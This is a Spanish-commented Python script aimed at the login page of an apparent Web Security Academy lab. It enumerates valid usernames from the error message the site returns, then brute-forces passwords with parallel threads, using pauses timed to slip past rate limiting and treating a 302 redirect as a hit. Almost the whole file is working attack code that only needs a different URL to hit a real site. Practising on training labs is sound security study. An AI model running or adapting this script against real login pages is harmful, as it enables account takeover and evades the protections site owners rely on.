from __future__ import annotations

import os
import re
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# --- CONFIGURACIÓN ---
MAX_THREADS = 50          # Hilos paralelos (ajustar según lab/rate limits)
RETRIES_PER_USER = 4      # Reintentos por usuario ante respuesta "invalid"
PASSWORD_THREADS = 10     # Hilos para fuerza bruta de contraseñas (más bajo = menos bloqueos)
SLEEP_AFTER_N_PASSWORDS = 3   # Dormir cada N intentos de contraseña (0 = desactivado)
SLEEP_SECONDS = 70        # Segundos de pausa anti-rate-limit

# Carpetas donde se guardan las respuestas (código, cabeceras, body)
CARPETA_RESULTADOS_USUARIOS = "resultados_usuarios"
CARPETA_RESULTADOS_PASSWORDS = "resultados_passwords"

burp0_url = "https://0aac003b04e570c78472325600e000c3.web-security-academy.net:443/login"
burp0_headers = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "es-ES,es;q=0.9",
    "Origin": "https://0aac003b04e570c78472325600e000c3.web-security-academy.net",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0aac003b04e570c78472325600e000c3.web-security-academy.net/login",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
}

print_lock = Lock()
file_lock = Lock()


def _sanitize_filename(s: str) -> str:
    """Nombre de archivo seguro (sin caracteres prohibidos en Windows/Linux)."""
    return re.sub(r'[\\/:*?"<>|]', "_", s).strip() or "unknown"


def guardar_respuesta(carpeta: str, nombre_base: str, res: requests.Response) -> str:
    """
    Guarda en un archivo: código de estado, cabeceras de respuesta y body.
    Devuelve la ruta del archivo creado.
    """
    os.makedirs(carpeta, exist_ok=True)
    safe = _sanitize_filename(nombre_base)
    path = os.path.join(carpeta, f"{safe}.txt")
    lines = [
        "=== CÓDIGO DE ESTADO ===",
        str(res.status_code),
        "",
        "=== CABECERAS DE RESPUESTA ===",
        *[f"{k}: {v}" for k, v in res.headers.items()],
        "",
        "=== BODY ===",
        res.text,
    ]
    content = "\n".join(lines)
    with file_lock:
        with open(path, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
    return path


def probar_usuario(username: str, password_prueba: str = "gdasgfdsg") -> tuple[str, bool]:
    """
    Una sola ejecución: prueba un usuario con una contraseña fija.
    Guarda cada respuesta en CARPETA_RESULTADOS_USUARIOS.
    Devuelve (username, es_valido).
    """
    user = username.strip()
    data = {"username": user, "password": password_prueba}
    for intento in range(RETRIES_PER_USER):
        try:
            res = requests.post(burp0_url, headers=burp0_headers, data=data, timeout=15)
            guardar_respuesta(
                CARPETA_RESULTADOS_USUARIOS,
                f"{_sanitize_filename(user)}_{intento}",
                res,
            )
            if "Invalid username or password." in res.text:
                continue
            return (user, True)
        except requests.RequestException as e:
            # Guardar respuesta de error (status vacío, body con el error)
            fake = type("Resp", (), {"status_code": 0, "headers": {}, "text": str(e)})()
            guardar_respuesta(
                CARPETA_RESULTADOS_USUARIOS,
                f"{_sanitize_filename(user)}_{intento}_error",
                fake,
            )
            continue
    return (user, False)


def probar_contraseña(username: str, password: str) -> tuple[str, str, bool]:
    """
    Una sola ejecución: prueba un usuario + contraseña.
    Guarda cada respuesta en CARPETA_RESULTADOS_PASSWORDS.
    Devuelve (username, password, encontrada).
    """
    pwd = password.strip()
    nombre_archivo = f"{_sanitize_filename(username)}_{_sanitize_filename(pwd)}"
    try:
        data = {"username": username, "password": pwd}
        res = requests.post(burp0_url, headers=burp0_headers, data=data, timeout=15)
        guardar_respuesta(CARPETA_RESULTADOS_PASSWORDS, nombre_archivo, res)
        return (username, pwd, res.status_code == 302)
    except requests.RequestException as e:
        fake = type("Resp", (), {"status_code": 0, "headers": {}, "text": str(e)})()
        guardar_respuesta(CARPETA_RESULTADOS_PASSWORDS, f"{nombre_archivo}_error", fake)
        return (username, pwd, False)


def enumerar_usuarios(usernames: list[str]) -> list[str]:
    """Enumeración de usuarios en paralelo con límite de hilos."""
    validos = []
    total = len(usernames)
    completados = 0

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futuras = {executor.submit(probar_usuario, u): u.strip() for u in usernames}
        for fut in as_completed(futuras):
            completados += 1
            user, es_valido = fut.result()
            with print_lock:
                if es_valido:
                    print(f"[{completados}/{total}] {user} -> VÁLIDO")
                    validos.append(user)
                else:
                    print(f"[{completados}/{total}] {user} -> inválido")
    return validos


def buscar_contraseña(username: str, passwords: list[str]) -> str | None:
    """Fuerza bruta de contraseña para un usuario (secuencial con pausas anti-rate-limit)."""
    for i, pwd in enumerate(passwords, 1):
        if SLEEP_AFTER_N_PASSWORDS and i % SLEEP_AFTER_N_PASSWORDS == 0 and i > 0:
            time.sleep(SLEEP_SECONDS)
        _, _, encontrada = probar_contraseña(username, pwd)
        if encontrada:
            return pwd
    return None


def buscar_contraseñas_paralelo(username: str, passwords: list[str]) -> str | None:
    """Fuerza bruta de contraseña con hilos (respetando pausas)."""
    total = len(passwords)
    resultado = None
    completados = 0

    with ThreadPoolExecutor(max_workers=PASSWORD_THREADS) as executor:
        futuras = {executor.submit(probar_contraseña, username, p): p for p in passwords}
        for fut in as_completed(futuras):
            completados += 1
            user, pwd, encontrada = fut.result()
            with print_lock:
                print(f"[{completados}/{total}] {username} -> {pwd}")
            if encontrada:
                resultado = pwd
                # Cancelar el resto no afecta a los ya enviados; salimos al terminar el bucle
    return resultado


def main():
    os.makedirs(CARPETA_RESULTADOS_USUARIOS, exist_ok=True)
    os.makedirs(CARPETA_RESULTADOS_PASSWORDS, exist_ok=True)
    print(f"Resultados usuarios  -> {os.path.abspath(CARPETA_RESULTADOS_USUARIOS)}")
    print(f"Resultados passwords -> {os.path.abspath(CARPETA_RESULTADOS_PASSWORDS)}\n")

    with open("usernames.txt", "r", encoding="utf-8") as f:
        usernames = f.readlines()
    with open("passwords.txt", "r", encoding="utf-8") as f:
        passwords = [p.strip() for p in f.readlines()]

    """
    print("--- Enumeración de usuarios ---")
    print(f"Usernames: {len(usernames)}, Passwords: {len(passwords)}, Threads: {MAX_THREADS}\n")

    usernames_validos = enumerar_usuarios(usernames)

    if not usernames_validos:
        print("\nNo se encontró ningún usuario válido.")
        return

    print(f"\n>>> Usuarios válidos: {usernames_validos}\n")
    """
    usernames_validos = ['app']
    for user in usernames_validos:
        print(f"--- Buscando contraseña para: {user} ---")
        # Opción rápida con hilos (puede activar rate limit):
        pwd = buscar_contraseñas_paralelo(user, passwords)
        # Opción más lenta pero más segura ante rate limit:
        # pwd = buscar_contraseña(user, passwords)
        if pwd:
            print(f"\n>>> Contraseña de '{user}': {pwd}")
        else:
            print(f"\n>>> No se encontró contraseña para '{user}'")
    

if __name__ == "__main__":
    main()
